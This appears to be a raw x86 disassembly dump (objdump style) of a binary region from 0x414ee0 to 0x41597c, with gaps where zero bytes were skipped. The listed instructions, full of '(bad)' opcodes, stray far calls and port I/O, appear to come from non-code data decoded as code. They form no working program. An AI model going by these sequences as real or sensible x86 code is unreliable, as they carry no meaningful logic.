  414ee0:	mov    fs,WORD PTR [esi]
  414ee2:	add    DWORD PTR [edx-0x749b0a01],esp
  414ee8:	retf   0xaf0d
  414eeb:	jp     0x414e8d
  414eed:	sbb    al,0x59
  414eef:	int    0x43
  414ef1:	xor    DWORD PTR [ebx],ecx
  414ef3:	loope  0x414eb7
  414ef5:	sub    BYTE PTR [ebp+0x3462693a],al
  414efb:	test   BYTE PTR [esi],bh
  414efd:	inc    esi
  414efe:	pop    eax
  414eff:	pop    ebp
  414f00:	pushf  
  414f01:	mov    ebp,0x4db83d29
  414f06:	pusha  
  414f07:	pop    edi
  414f08:	push   esp
  414f09:	test   BYTE PTR [edi+0x7206d6ac],bl
  414f0f:	das    
  414f10:	retf   
	...
  414f71:	add    BYTE PTR [eax],al
  414f73:	add    BYTE PTR [edi],dh
  414f75:	data16 xor al,0x9b
  414f78:	jne    0x414f55
  414f7a:	mov    edi,0xe45ae5ee
  414f7f:	call   0xdd13:0xfb29437c
  414f86:	add    BYTE PTR [eax],al
  414f88:	add    eax,0x2d000001
  414f8d:	jmp    0x9f45212e
  414f92:	in     al,dx
  414f93:	push   ebp
  414f94:	leave  
  414f95:	or     dh,dh
  414f97:	je     0x414f47
  414f99:	jmp    0x254495c1
  414f9e:	jae    0x414f74
  414fa0:	push   edx
  414fa1:	add    DWORD PTR [edx+0x76f8ffdb],0x7b
  414fa8:	js     0x414f54
  414faa:	cdq    
  414fab:	pop    ebx
  414fac:	and    BYTE PTR [edi-0x54],ch
  414faf:	cmp    eax,0x6e5b504d
  414fb4:	jb     0x414f9c
  414fb6:	jg     0x414fb2
  414fb8:	cmp    BYTE PTR [edi-0x6a],0x66
  414fbc:	lods   eax,DWORD PTR ds:[esi]
  414fbd:	dec    ebx
  414fbe:	lahf   
  414fbf:	pop    eax
  414fc0:	lods   al,BYTE PTR ds:[esi]
  414fc1:	imul   ebp,DWORD PTR [edi-0x22],0xda7b4538
  414fc8:	inc    edx
  414fc9:	ror    BYTE PTR gs:[eax],cl
  414fcc:	cdq    
  414fcd:	and    al,0x67
  414fcf:	adc    eax,0x53ba0fd9
  414fd4:	fstp   TBYTE PTR [eax-0x31]
  414fd7:	dec    eax
  414fd8:	pop    es
  414fd9:	repz inc ah
  414fdc:	das    
  414fdd:	and    eax,0xf53567c9
  414fe2:	add    DWORD PTR [ebp-0x382702c4],ebp
  414fe8:	or     al,0xf4
  414fea:	jmp    0x41501c
  414fec:	out    dx,eax
  414fed:	mov    dh,0xca
  414fef:	xchg   edx,eax
  414ff0:	push   ss
  414ff1:	lods   al,BYTE PTR ds:[esi]
  414ff2:	pop    ecx
  414ff3:	pop    ss
  414ff4:	daa    
  414ff5:	inc    edx
  414ff6:	push   ebx
  414ff7:	pop    esp
  414ff8:	xchg   ecx,eax
  414ff9:	xchg   ebp,eax
  414ffa:	lds    edi,FWORD PTR ds:0x7b2664c4
  415000:	jle    0x415077
  415002:	in     eax,dx
  415003:	jg     0x414fa5
  415005:	sub    eax,0xcc19c8c9
  41500a:	repnz pushf 
  41500c:	jne    0x414fd2
  41500e:	add    al,0x51
  415010:	sti    
  415011:	xchg   DWORD PTR [edi+ebp*2-0x43],edi
  415015:	cmp    esp,DWORD PTR [eax+0x20]
  415018:	mov    ebp,DWORD PTR [ecx+0x1c063683]
  41501e:	push   0x568a1ed2
  415023:	mov    dl,0xdb
  415025:	cmp    al,BYTE PTR [ebp-0x4291e54d]
  41502b:	(bad)  
  41502c:	mov    al,ds:0x75a786c
  415031:	inc    ecx
  415032:	ds pop esi
  415034:	push   0x28
  415036:	std    
  415037:	aad    0x84
  415039:	retf   0x7b81
  41503c:	or     BYTE PTR [edi-0x23a625f1],ah
  415042:	mov    bh,0xec
  415044:	pop    ds
  415045:	mov    esp,0xfd274574
  41504a:	stc    
  41504b:	or     DWORD PTR [ecx],ecx
  41504d:	jge    0x41509a
  41504f:	mul    DWORD PTR [edi]
  415051:	ins    BYTE PTR es:[edi],dx
  415052:	sub    ah,dh
  415054:	enter  0x337c,0x68
  415058:	data16 adc cl,BYTE PTR [eax-0x55]
  41505c:	enter  0xb2df,0x1a
  415060:	push   es
  415061:	(bad)  
  415062:	jmp    0x3014c822
  415067:	sbb    al,0xb5
  415069:	sbb    esp,edi
  41506b:	int3   
  41506c:	pop    ss
  41506d:	cmp    DWORD PTR [edx+0x2b],eax
  415070:	push   esp
  415071:	adc    ecx,DWORD PTR [edi]
  415073:	xchg   dx,ax
  415075:	inc    edx
  415076:	call   0x330da460
  41507b:	mov    al,ds:0x25ba9630
  415080:	data16 add bh,ah
  415083:	sbb    eax,0xf4f301e6
  415088:	in     al,0x83
  41508a:	sahf   
  41508b:	mov    BYTE PTR [ebp+0x1bfcb829],bh
	...
  4150f1:	add    BYTE PTR [eax],al
  4150f3:	add    BYTE PTR [ebx+0x2],bh
  4150f6:	add    ebp,ebx
  4150f8:	jnp    0x4150e5
  4150fa:	sti    
  4150fb:	xchg   edx,eax
  4150fc:	lahf   
  4150fd:	mov    esi,0xf71dfc2d
  415102:	enter  0x18ac,0xde
  415106:	add    BYTE PTR [eax],al
  415108:	add    eax,0x3d000001
  41510d:	lock mov ?,WORD PTR [ebx+0x3f80c24d]
  415114:	(bad)  
  415115:	or     dh,al
  415117:	aas    
  415118:	xchg   edi,eax
  415119:	fsub   DWORD PTR [esi+ecx*8]
  41511c:	push   0x320e3dcc
  415121:	cld    
  415122:	mov    bl,bl
  415124:	sub    BYTE PTR [edx-0x7a],cl
  415127:	xchg   BYTE PTR [ebp+esi*4-0x37],dl
  41512b:	mov    esp,0x7d8189ac
  415130:	mov    ds:0xd1ffb8fc,eax
  415135:	stos   DWORD PTR es:[edi],eax
  415136:	inc    ecx
  415137:	push   ebx
  415138:	push   ebp
  415139:	cdq    
  41513a:	popa   
  41513b:	dec    ebp
  41513c:	xor    edx,esp
  41513e:	xchg   ecx,eax
  41513f:	mov    gs,ebp
  415141:	inc    ebx
  415142:	aam    0xd
  415144:	lods   al,BYTE PTR ds:[esi]
  415145:	popa   
  415146:	adc    DWORD PTR [eax],eax
  415148:	cdq    
  415149:	sbb    DWORD PTR [ebx+0x7091da6c],0x72
  415150:	xchg   esp,eax
  415152:	xchg   ebx,eax
  415153:	push   esi
  415154:	fbld   TBYTE PTR [ebp-0x163e8bf1]
  41515a:	add    eax,0x465c58c8
  41515f:	mov    al,ds:0xc0096be9
  415164:	or     DWORD PTR [edx+0x1c7aabb1],ecx
  41516a:	outs   dx,DWORD PTR ds:[esi]
  41516b:	adc    bl,BYTE PTR [edx-0x3b224b2d]
  415171:	retf   0x28c0
  415174:	sub    esp,ecx
  415176:	cmp    edi,ebp
  415178:	ins    BYTE PTR es:[edi],dx
  415179:	cwde   
  41517a:	pop    esi
  41517b:	xor    al,0x93
  41517d:	in     al,0x88
  41517f:	jg     0x4151d3
  415181:	mov    ah,0xe8
  415183:	packsswb mm3,mm0
  415186:	cdq    
  415187:	cmp    al,0x6a
  415189:	cmp    eax,edi
  41518b:	leave  
  41518c:	dec    eax
  41518d:	pop    edx
  41518e:	inc    DWORD PTR [eax+0x30]
  415191:	jecxz  0x415170
  415193:	mov    al,0x55
  415195:	js     0x415154
  415197:	mov    ds:0x46b6f6f6,eax
  41519c:	shr    dl,0xaa
  41519f:	int    0xb4
  4151a1:	popf   
  4151a2:	xor    eax,0xe14a7c9
  4151a7:	imul   eax,DWORD PTR [ecx],0x15d843d5
  4151ad:	add    edi,ebx
  4151af:	mov    DWORD PTR [esp+eiz*2-0x3de098bf],esi
  4151b6:	adc    ecx,DWORD PTR [edi-0x6b8db95]
  4151bc:	add    al,0xeb
  4151be:	and    ecx,DWORD PTR [edx+0x662f1303]
  4151c4:	mov    edx,0x4bb6220e
  4151c9:	je     0x41515e
  4151cb:	pop    eax
  4151cc:	scas   al,BYTE PTR es:[edi]
  4151cd:	popf   
  4151ce:	sub    eax,0x3cc9b3b5
  4151d3:	dec    eax
  4151d4:	jb     0x4151fb
  4151d6:	adc    DWORD PTR [bx+di],esi
  4151d9:	ret    
  4151da:	push   esp
  4151db:	push   ss
  4151dc:	mov    cl,0x2b
  4151de:	mov    al,0x66
  4151e0:	mov    edi,DWORD PTR [edi+0x3a]
  4151e3:	stos   BYTE PTR es:[edi],al
  4151e4:	call   eax
  4151e6:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4151e7:	and    eax,0x5516d91b
  4151ec:	iret   
  4151ed:	inc    ecx
  4151ee:	pop    esi
  4151ef:	rcl    DWORD PTR [edi+0x7],1
  4151f2:	int3   
  4151f3:	add    DWORD PTR [eax+ebp*2-0x657b1821],ecx
  4151fa:	inc    edx
  4151fb:	popf   
  4151fc:	fimul  DWORD PTR [eax-0x7a833949]
  415202:	push   esi
  415203:	jge    0x415217
  415205:	add    cl,BYTE PTR [esi]
  415207:	mov    ecx,0xe7209520
  41520c:	out    dx,eax
  41520d:	inc    ebp
  41520e:	adc    eax,0xc6aa
	...
  415273:	add    BYTE PTR [edi+edx*4],ch
  415276:	pop    ds
  415277:	sar    DWORD PTR [edi-0x6001127],1
  41527d:	(bad)  
  41527e:	mov    ecx,0xab271a0b
  415283:	sub    DWORD PTR ds:0x50000df,ebx
  415289:	add    DWORD PTR [eax],eax
  41528b:	add    dh,ch
  41528d:	mov    edx,0x94e8cc4d
  415292:	sub    esi,DWORD PTR [ecx]
  415294:	popa   
  415295:	cmp    DWORD PTR [edx-0x2cba6ff0],0x5e
  41529c:	dec    edi
  41529d:	adc    DWORD PTR [eax+0x65e339db],esp
  4152a3:	and    ebx,eax
  4152a5:	sub    al,0xd8
  4152a7:	push   ss
  4152a8:	fisubr WORD PTR [esi-0x64]
  4152ab:	in     eax,0xa0
  4152ad:	push   ecx
  4152ae:	pop    edi
  4152af:	xor    ch,BYTE PTR [ebx-0x75]
  4152b2:	daa    
  4152b3:	xchg   ebx,eax
  4152b4:	mov    ecx,0xcaf84f1
  4152b9:	nop
  4152ba:	lods   al,BYTE PTR cs:[esi]
  4152bc:	xchg   edi,eax
  4152bd:	mov    bl,0x5a
  4152bf:	add    eax,0xaeadb0cc
  4152c4:	les    edx,FWORD PTR [ecx+0x70]
  4152c7:	mov    eax,ds:0x933749f7
  4152cc:	jecxz  0x415338
  4152ce:	(bad)  
  4152cf:	jo     0x4152c9
  4152d1:	out    dx,eax
  4152d2:	imul   ecx,DWORD PTR [esi],0xe5c4e99e
  4152d8:	push   ebx
  4152d9:	mov    edi,0x7c29e3a9
  4152de:	add    eax,0xfb2403c7
  4152e3:	xor    ebx,edx
  4152e5:	inc    ebp
  4152e6:	ds pop edi
  4152e8:	shl    DWORD PTR [ebp+0x1a9c2a49],cl
  4152ee:	adc    DWORD PTR [ebx-0x12],ebx
  4152f1:	mov    ds:0xa9906aba,al
  4152f6:	jle    0x415357
  4152f8:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4152f9:	sbb    BYTE PTR [edi+0x54],bl
  4152fc:	ss in  al,dx
  4152fe:	icebp  
  4152ff:	out    0xd6,eax
  415301:	(bad)  
  415302:	sub    bh,BYTE PTR [esi]
  415304:	popa   
  415305:	xchg   edx,eax
  415306:	or     DWORD PTR [eax+eax*1+0x55],0xffffffef
  41530b:	inc    ebx
  41530c:	cmp    eax,0x63990bf4
  415311:	mov    DWORD PTR [edi+0x68],ebx
  415314:	loop   0x415366
  415316:	mov    ds:0xf5f5911f,eax
  41531b:	std    
  41531c:	cmp    al,0x7c
  41531e:	mov    ecx,0x9b5b309c
  415323:	lods   al,BYTE PTR ds:[esi]
  415324:	mov    fs,WORD PTR [ebx+0x16]
  415327:	mul    cl
  415329:	ins    DWORD PTR es:[edi],dx
  41532a:	mov    edx,0x9fec49bb
  41532f:	bound  edx,QWORD PTR [ebp+0x6adad6bc]
  415335:	cmp    DWORD PTR [ebp+0x1865d7aa],ebx
  41533b:	cmc    
  41533c:	daa    
  41533d:	pop    ebp
  41533e:	cmp    dh,bh
  415340:	xchg   ebx,eax
  415341:	dec    esi
  415342:	sbb    DWORD PTR fs:[ebx+0x48],esp
  415346:	add    al,0x4b
  415348:	(bad)  
  415349:	pop    ecx
  41534a:	int    0xff
  41534c:	test   DWORD PTR [ecx],esp
  41534e:	sbb    esi,DWORD PTR [ecx]
  415350:	sub    ebp,esp
  415352:	gs mov dl,0xba
  415355:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  415356:	outs   dx,DWORD PTR ds:[esi]
  415357:	sub    edi,ecx
  415359:	das    
  41535a:	mov    edx,ecx
  41535c:	push   edx
  41535d:	push   ecx
  41535e:	xchg   esp,eax
  41535f:	and    BYTE PTR [ebp-0x5aae3e19],0xb6
  415366:	sahf   
  415367:	lock leave 
  415369:	xchg   esp,eax
  41536a:	push   ebx
  41536b:	mov    ch,0x34
  41536d:	pop    ebp
  41536e:	or     al,0x22
  415370:	jb     0x4153e7
  415372:	and    edx,0x37
  415375:	adc    al,cl
  415377:	enter  0xd926,0x57
  41537b:	in     eax,0x1b
  41537d:	out    0x2,eax
  41537f:	ds mov ch,0xf7
  415382:	out    dx,eax
  415383:	and    BYTE PTR [ecx],bl
  415385:	jge    0x415347
  415387:	push   edx
  415388:	inc    si
  41538a:	inc    BYTE PTR [ecx-0x5725277f]
  415390:	lahf   
	...
  4153f1:	add    BYTE PTR [eax],al
  4153f3:	add    BYTE PTR [ebp-0x10],ch
  4153f6:	repz jmp FWORD PTR cs:[edi]
  4153fa:	std    
  4153fb:	repz mov edi,0xad3e5b0
  415401:	xchg   edx,eax
  415402:	aaa    
  415403:	(bad)  
  415404:	and    ah,al
  415406:	add    BYTE PTR [eax],al
  415408:	add    eax,0x91000001
  41540d:	pusha  
  41540e:	mov    DWORD PTR [esi],ebx
  415410:	inc    ebp
  415411:	aam    0xf9
  415413:	shl    BYTE PTR [edi-0x29],cl
  415416:	mov    eax,?
  415418:	inc    ecx
  415419:	cmp    al,BYTE PTR [esi+0x40]
  41541c:	mov    WORD PTR [edx],fs
  41541e:	add    al,0x54
  415420:	sti    
  415421:	cmp    BYTE PTR [edx],0x12
  415424:	mov    bh,0x59
  415426:	push   eax
  415427:	fdivr  QWORD PTR [esi]
  415429:	aas    
  41542a:	or     ah,BYTE PTR [ebx+0x71]
  41542d:	lea    ecx,[ebx-0xe]
  415430:	je     0x4153f2
  415432:	fucom  st(5)
  415434:	fcom   DWORD PTR [ecx]
  415436:	ds pop ss
  415438:	jle    0x415480
  41543a:	jno    0x41543b
  41543c:	inc    edx
  41543d:	dec    ebp
  41543e:	mov    dh,0x12
  415440:	add    BYTE PTR [ecx+0x2b],0xb8
  415444:	inc    eax
  415445:	jge    0x4153f3
  415447:	inc    ebp
  415448:	(bad)  
  415449:	icebp  
  41544a:	cmp    ebp,DWORD PTR [ecx-0x1613d149]
  415450:	in     al,0xa2
  415452:	cmp    al,0x62
  415454:	lods   al,BYTE PTR ds:[esi]
  415455:	add    DWORD PTR [edi],esp
  415457:	in     eax,0x89
  415459:	cwde   
  41545a:	jae    0x4154b1
  41545c:	cmp    dl,dl
  41545e:	push   es
  41545f:	ja     0x4154d3
  415461:	test   eax,0xade0c8fa
  415466:	adc    al,0x6
  415468:	mov    edx,0xdc21939b
  41546d:	dec    ebx
  41546e:	cdq    
  41546f:	cmp    BYTE PTR [ebx-0xb87a841],dl
  415475:	or     bh,BYTE PTR [edx-0x24]
  415478:	dec    eax
  415479:	(bad)  
  41547a:	xor    DWORD PTR [edx-0x14c014c8],ebp
  415480:	mov    dl,0xa7
  415482:	add    BYTE PTR [esi-0x31b19b8b],0x94
  415489:	(bad)  
  41548a:	mov    ds:0x360311ee,eax
  41548f:	push   ecx
  415490:	jno    0x415470
  415492:	fmulp  st(0),st
  415494:	inc    esp
  415495:	push   esp
  415496:	pop    eax
  415497:	lds    esi,FWORD PTR [ecx-0x691093fa]
  41549d:	cmp    DWORD PTR [edi-0x6ab4f37],0xffffff82
  4154a4:	sbb    ch,al
  4154a6:	out    dx,eax
  4154a7:	mov    al,ds:0xc17c8e8f
  4154ac:	fiadd  WORD PTR [edi-0x66bf63]
  4154b2:	push   0xffffffb6
  4154b4:	or     DWORD PTR [eax-0x6fd9cf27],esi
  4154ba:	or     eax,0x6f525079
  4154bf:	inc    esi
  4154c0:	add    eax,0x5c59d8df
  4154c5:	lds    edi,FWORD PTR [esi+0x487e70f3]
  4154cb:	mov    eax,0xf4d3ad13
  4154d0:	sub    ebp,DWORD PTR [eax]
  4154d2:	xor    BYTE PTR [ebx+0x735cc144],bl
  4154d8:	mov    ah,0x28
  4154da:	push   ebp
  4154db:	mov    edi,0xe08f6cda
  4154e0:	sbb    ch,0x9f
  4154e3:	ins    BYTE PTR es:[edi],dx
  4154e4:	jg     0x41551e
  4154e6:	ret    0x162c
  4154e9:	(bad)  
  4154eb:	jle    0x415501
  4154ed:	repz repz rcl DWORD PTR ds:[ebp-0x7145f83b],1
  4154f6:	xchg   edx,eax
  4154f7:	dec    edx
  4154f8:	out    dx,al
  4154f9:	cmp    DWORD PTR [ebx],0xffffff86
  4154fc:	stc    
  4154fd:	xchg   esp,eax
  4154fe:	aad    0xb7
  415500:	(bad)  
  415501:	ret    0x192
  415504:	pop    ebp
  415505:	mov    ebp,0xa10c510c
  41550a:	mov    bl,bl
  41550c:	inc    edi
  41550d:	mov    ds:0x725794,eax
	...
  415572:	add    BYTE PTR [eax],al
  415574:	in     al,0xf0
  415576:	sub    DWORD PTR [edx],ecx
  415578:	cmp    eax,0xa2fee7db
  41557d:	arpl   WORD PTR [ebx],bp
  41557f:	je     0x4155a1
  415581:	xlat   BYTE PTR ds:[ebx]
  415582:	jnp    0x415527
  415584:	daa    
  415585:	loope  0x415587
  415587:	add    BYTE PTR ds:0xc2000001,al
  41558d:	pop    edx
  41558e:	popa   
  41558f:	jno    0x4155dc
  415591:	push   ecx
  415592:	icebp  
  415593:	pop    esp
  415595:	loop   0x4155f8
  415597:	ins    BYTE PTR es:[edi],dx
  415598:	icebp  
  415599:	mov    cl,0x66
  41559b:	in     al,0x4a
  41559d:	push   edi
  41559e:	(bad)  
  41559f:	das    
  4155a0:	nop
  4155a1:	push   edx
  4155a2:	call   0x131b:0x1ad4f6dd
  4155a9:	push   ss
  4155aa:	ds jne 0x4155da
  4155ad:	cmp    eax,0x3d73669f
  4155b2:	(bad)  
  4155b3:	lock out 0xad,al
  4155b6:	xchg   esp,eax
  4155b7:	scas   eax,DWORD PTR es:[edi]
  4155b8:	aam    0xa7
  4155ba:	outs   dx,DWORD PTR ds:[esi]
  4155bb:	add    BYTE PTR [edi],bh
  4155bd:	lea    ebp,[eax-0x7b]
  4155c0:	add    DWORD PTR [edi],ecx
  4155c2:	inc    eax
  4155c3:	dec    ebp
  4155c4:	aam    0x93
  4155c6:	sub    eax,0xb05da338
  4155cb:	or     DWORD PTR [esi+0x74],edi
  4155ce:	outs   dx,DWORD PTR ds:[esi]
  4155cf:	mov    ah,0xcc
  4155d1:	inc    esp
  4155d2:	lea    esi,[ecx]
  4155d4:	and    eax,0xe592fa5c
  4155d9:	in     eax,0x98
  4155db:	daa    
  4155dc:	(bad)  
  4155dd:	aad    0x97
  4155df:	push   ss
  4155e0:	jo     0x4155ef
  4155e2:	call   0xc6d5b6de
  4155e7:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4155e8:	outs   dx,DWORD PTR ds:[esi]
  4155e9:	push   0xe
  4155eb:	pushf  
  4155ec:	dec    edi
  4155ed:	mov    eax,ds:0xfd959adf
  4155f2:	jmp    0x415601
  4155f4:	push   ecx
  4155f5:	imul   esp,DWORD PTR [ebx-0x2],0x57a321f4
  4155fc:	dec    edx
  4155fd:	xor    DWORD PTR [edi-0x4b],ecx
  415600:	call   0x68a9:0xa58eaf3b
  415607:	adc    BYTE PTR ds:0x3d03ef22,bl
  41560d:	pop    ebx
  41560e:	ja     0x415609
  415610:	push   esp
  415611:	daa    
  415612:	adc    edx,DWORD PTR [eax-0x39497dee]
  415618:	(bad)  
  415619:	xor    esp,ecx
  41561b:	pushf  
  41561c:	mov    ch,0x40
  41561e:	pop    esi
  41561f:	cmp    ebp,DWORD PTR [eax-0x43]
  415622:	and    ah,BYTE PTR [ebx+esi*1]
  415625:	test   DWORD PTR ss:0x98cf2079,esp
  41562c:	sbb    al,0xa3
  41562e:	and    eax,DWORD PTR [esi+0x37]
  415631:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  415632:	nop
  415633:	and    al,0xdd
  415635:	std    
  415636:	xor    DWORD PTR [ecx],edx
  415638:	sbb    DWORD PTR [esp+ebp*1-0x2684a6f7],eax
  41563f:	dec    ebx
  415640:	pop    edi
  415641:	push   es
  415642:	jne    0x41567f
  415644:	call   0x8f4a:0xe02e5531
  41564b:	xchg   ebp,eax
  41564c:	and    DWORD PTR [ecx],esp
  41564e:	test   al,0xad
  415650:	mov    ah,0xb8
  415652:	or     eax,0xae8eeb15
  415657:	ror    DWORD PTR [edx-0x17],0x83
  41565b:	dec    eax
  41565c:	sar    ebx,0xb5
  41565f:	adc    BYTE PTR [ebx+0x4f],0xc
  415663:	jbe    0x415641
  415665:	fnsave [esi+edi*4-0x19]
  415669:	inc    esp
  41566a:	mov    ecx,0x5020756b
  41566f:	dec    ecx
  415670:	jl     0x415686
  415672:	pop    es
  415673:	mov    dh,0x42
  415675:	inc    ecx
  415676:	adc    esp,DWORD PTR [ebx-0xa]
  415679:	(bad)  
  41567a:	test   DWORD PTR [esp+edx*4+0x40],0xf1a59ce0
  415682:	call   0xc4e456e
  415687:	add    al,0xb6
  415689:	test   DWORD PTR [ecx+0x346d1bb],esp
  41568f:	inc    ebp
  415690:	jnp    0x415692
	...
  4156f2:	add    BYTE PTR [eax],al
  4156f4:	ins    DWORD PTR es:[edi],dx
  4156f5:	call   0xbafd:0x67ff45bc
  4156fc:	mov    bl,0xba
  4156fe:	inc    esi
  4156ff:	sub    al,0xab
  415701:	mov    ebx,0xe22c0586
  415706:	add    BYTE PTR [eax],al
  415708:	add    eax,0x97000001
  41570d:	loop   0x4156ee
  41570f:	pusha  
  415710:	pusha  
  415711:	and    DWORD PTR [ebx],0x66
  415714:	pop    esp
  415715:	xchg   DWORD PTR [ebx-0x38],esp
  415718:	push   eax
  41571a:	ds loop 0x41574b
  41571d:	lods   eax,DWORD PTR ds:[esi]
  41571e:	stos   BYTE PTR es:[edi],al
  41571f:	bt     DWORD PTR [eax+0x20588433],esi
  415726:	in     eax,0x2f
  415728:	lahf   
  415729:	xchg   BYTE PTR [esi-0x58],cl
  41572c:	adc    edx,eax
  41572e:	adc    eax,0xb66f49b6
  415733:	bound  ebx,QWORD PTR [esi]
  415735:	mov    ds:0x15190ec0,eax
  41573a:	and    BYTE PTR [eax-0x11fe3611],0x7a
  415741:	stos   BYTE PTR es:[edi],al
  415742:	dec    ecx
  415743:	mov    ebx,0xadd6cefc
  415748:	inc    eax
  415749:	sbb    ebx,DWORD PTR [edi-0x57]
  41574c:	or     ebx,DWORD PTR [esp+ebx*2]
  41574f:	sbb    esp,esi
  415751:	adc    al,0xc4
  415753:	cmp    dl,ch
  415755:	pop    ds
  415756:	pop    ss
  415757:	sbb    esi,esi
  415759:	sub    bh,BYTE PTR [ecx-0x4709162f]
  41575f:	in     eax,dx
  415760:	inc    edx
  415761:	mov    ?,ecx
  415763:	xchg   ecx,eax
  415764:	test   DWORD PTR [ebx-0x5df24262],0x99f9b448
  41576e:	sahf   
  41576f:	cmp    DWORD PTR [ebx-0x1f4c8b00],edi
  415775:	imul   BYTE PTR [ebx-0x556fddf]
  41577b:	and    al,ch
  41577d:	jae    0x41577f
  41577f:	sbb    eax,0x6f97d604
  415784:	mov    esi,es
  415786:	fdivr  DWORD PTR [eax]
  415788:	or     ecx,DWORD PTR [ebp-0x3c89d937]
  41578e:	popf   
  41578f:	fcomp  st(0)
  415791:	in     eax,0xd7
  415793:	adc    DWORD PTR [ecx+0x43b9c69d],esp
  415799:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41579a:	stos   BYTE PTR es:[edi],al
  41579b:	xchg   esi,eax
  41579c:	pop    ds
  41579d:	int3   
  41579e:	and    BYTE PTR [esi+0x6381ce62],dh
  4157a4:	cdq    
  4157a5:	enter  0xb649,0x71
  4157a9:	xchg   ecx,eax
  4157aa:	push   ebp
  4157ab:	js     0x41576d
  4157ad:	jbe    0x415800
  4157af:	xor    edx,0x3ebc8f0d
  4157b5:	sub    ebx,DWORD PTR [ebp+0x79448c2e]
  4157bb:	ins    BYTE PTR es:[edi],dx
  4157bc:	jne    0x415771
  4157be:	and    eax,0xd2aea25e
  4157c3:	ret    0x7af9
  4157c6:	pop    ebp
  4157c7:	test   DWORD PTR [esi+0x7c],edi
  4157ca:	push   eax
  4157cb:	sbb    BYTE PTR [esi+0x49e04bda],bh
  4157d1:	push   edx
  4157d2:	scas   eax,DWORD PTR es:[edi]
  4157d3:	xchg   DWORD PTR [edi+0x68a61ac5],esi
  4157d9:	shl    BYTE PTR [ebx-0x57695905],cl
  4157df:	or     ebp,DWORD PTR [eax-0xde7467e]
  4157e5:	ror    BYTE PTR [edx+0xe],cl
  4157e8:	stc    
  4157e9:	pushf  
  4157ea:	sbb    eax,0xdad64150
  4157ef:	sub    DWORD PTR [edx+esi*2-0x1],esi
  4157f3:	and    eax,0x57c4fbce
  4157f8:	jp     0x4157d3
  4157fa:	repnz pop es
  4157fc:	test   eax,0xb15f7603
  415801:	nop
  415802:	(bad)  
  415804:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  415805:	inc    ebx
  415806:	and    al,0x99
  415808:	sub    al,0xc4
  41580a:	inc    ebx
  41580b:	mov    ch,0x1e
  41580d:	dec    esp
  41580e:	sti    
  41580f:	push   0xffffffb7
	...
  415871:	add    BYTE PTR [eax],al
  415873:	add    bl,cl
  415875:	(bad)  
  415876:	xchg   ebx,eax
  415877:	in     al,dx
  415878:	mov    bh,0xed
  41587a:	(bad)  
  41587b:	inc    DWORD PTR [edi]
  41587d:	(bad)  
  41587f:	rcr    DWORD PTR [ebx+0x31f3ceea],cl
  415885:	jecxz  0x415887
  415887:	add    BYTE PTR ds:0x95000001,al
  41588d:	es (bad) 
  41588f:	fs pop ss
  415891:	sbb    BYTE PTR [eax+0x28],0xf
  415895:	fs mov ecx,0x5f30a96a
  41589b:	or     cl,BYTE PTR [esi-0x23]
  41589e:	test   eax,0x27fbbed3
  4158a3:	add    edi,DWORD PTR [edx]
  4158a5:	pusha  
  4158a6:	fstp   TBYTE PTR [ecx+eax*1-0x7fbac058]
  4158ad:	sub    esi,ebx
  4158af:	push   edx
  4158b0:	ss dec esi
  4158b2:	inc    ecx
  4158b3:	and    al,0xfa
  4158b5:	mov    ds:0x4d26767c,eax
  4158ba:	push   edi
  4158bb:	lock mov bl,0x4c
  4158be:	adc    al,0x14
  4158c0:	jge    0x4158b1
  4158c2:	xchg   BYTE PTR [esi-0x7b],dl
  4158c5:	lahf   
  4158c6:	rcl    BYTE PTR [ebp-0x64],cl
  4158c9:	out    0xc5,al
  4158cb:	mov    esp,0xdc06c1c6
  4158d0:	mov    esp,0x663c431f
  4158d5:	ins    BYTE PTR es:[edi],dx
  4158d6:	lds    ebx,FWORD PTR [eax]
  4158d8:	clc    
  4158d9:	fadd   DWORD PTR [edx]
  4158db:	jle    0x4158b6
  4158dd:	arpl   WORD PTR [ebx+0x23],sp
  4158e0:	cmp    bl,BYTE PTR [ecx-0x4c]
  4158e3:	sub    al,0x87
  4158e5:	add    BYTE PTR [ebx-0x19fbe20d],al
  4158eb:	leave  
  4158ec:	add    ecx,DWORD PTR [edi*4+0x5ca3f262]
  4158f3:	aad    0x26
  4158f5:	test   BYTE PTR [edi],cl
  4158f7:	pop    es
  4158f8:	pop    ebx
  4158f9:	jge    0x415912
  4158fb:	pop    ebp
  4158fc:	outs   dx,BYTE PTR ds:[esi]
  4158fd:	add    eax,0x2d762dd0
  415902:	sbb    BYTE PTR [ebx-0x23cf00bf],0xb6
  415909:	pop    ebx
  41590a:	pop    eax
  41590b:	adc    ch,BYTE PTR [ecx]
  41590d:	mov    al,ds:0x963e4425
  415912:	or     BYTE PTR [ebp+eax*4+0x53],ah
  415916:	mov    al,ds:0x397f3296
  41591b:	gs in  al,0xb
  41591e:	pop    ds
  41591f:	popa   
  415920:	add    BYTE PTR [ecx+eiz*1],bl
  415923:	xor    BYTE PTR [edx],dl
  415925:	and    eax,0x549f71
  41592a:	xchg   ebp,eax
  41592b:	outs   dx,DWORD PTR ds:[esi]
  41592c:	sti    
  41592d:	loope  0x4159a6
  41592f:	jl     0x4158e2
  415931:	cmc    
  415932:	dec    ecx
  415933:	inc    edx
  415934:	xor    ebx,edi
  415936:	shl    DWORD PTR [ebx],0xd
  415939:	jno    0x41596a
  41593b:	lahf   
  41593c:	cld    
  41593d:	pop    ds
  41593e:	push   eax
  41593f:	cmp    ecx,DWORD PTR [edi]
  415941:	sub    eax,0x85ea3427
  415946:	xor    dl,BYTE PTR [ecx-0x2715c2e2]
  41594c:	sub    dl,BYTE PTR [edi+0x6fd51a90]
  415952:	test   eax,0xea5fb4b6
  415957:	in     al,dx
  415958:	(bad)  
  415959:	jl     0x4159a0
  41595b:	mov    ss,ebx
  41595d:	sar    BYTE PTR [edx-0x17a247a4],0xec
  415964:	xlat   BYTE PTR ds:[ebx]
  415965:	les    ebp,FWORD PTR [eax]
  415967:	push   eax
  415968:	loop   0x415908
  41596a:	sbb    eax,0x1819c214
  41596f:	pop    ebx
  415970:	out    dx,eax
  415971:	call   0xdf16e922
  415976:	sbb    edi,DWORD PTR [ecx+0x1e]
  415979:	cli    
  41597a:	(bad)  
  41597b:	push   eax
  41597c:	xor    al,al
